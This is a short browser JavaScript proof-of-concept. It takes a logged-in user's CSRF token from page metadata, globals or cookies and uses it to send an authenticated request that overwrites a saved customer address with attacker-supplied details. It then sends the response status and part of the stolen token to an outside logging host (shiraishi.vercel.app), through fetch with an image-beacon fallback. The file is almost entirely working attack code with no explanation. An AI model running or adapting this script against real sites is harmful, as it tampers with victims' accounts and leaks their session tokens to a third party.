(async () => {
  const log = (...a) => console.log('[PoC]', ...a);

  const getCsrf = () => {
    const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
    if (m && m.content) return m.content;

    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props) {
      const p = window.__NEXT_DATA__.props.pageProps || {};
      if (p.csrfToken) return p.csrfToken;
    }

    if (window.csrfToken) return window.csrfToken;

    for (const k of Object.keys(window)) {
      if (/csrf/i.test(k) && typeof window[k] === 'string' && window[k].length > 10) {
        return window[k];
      }
    }

    const c = document.cookie.match(/(?:^|;\s*)_csrfSecret=([^;]+)/);
    if (c) return decodeURIComponent(c[1]);

    return null;
  };

  const token = getCsrf();
  log('token:', token);
  if (!token) return;

  const body = JSON.stringify({
    item: {
      firstName: "a",
      lastName: "a",
      countryCode: "GB",
      address1: "Kings Barbers, 85 Queens Road",
      address2: "",
      city: "Hastings",
      postalCode: "TN34 1RL",
      phone: "",
      addressId: "1790419160027"
    }
  });

  const res = await fetch('/api/customer/address', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'x-csrf-token': token
    },
    body
  }).catch(e => {
    log('fetch failed:', e.message);
    return null;
  });

  if (!res) return;
  log('status:', res.status);

  const txt = await res.text().catch(() => '');
  log('response:', txt.slice(0, 500));

  try {
    await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&t=' + encodeURIComponent(token.slice(0, 20)));
  } catch (e) {
    new Image().src = 'https://shiraishi.vercel.app/log?ok=' + res.status;
  }
})();
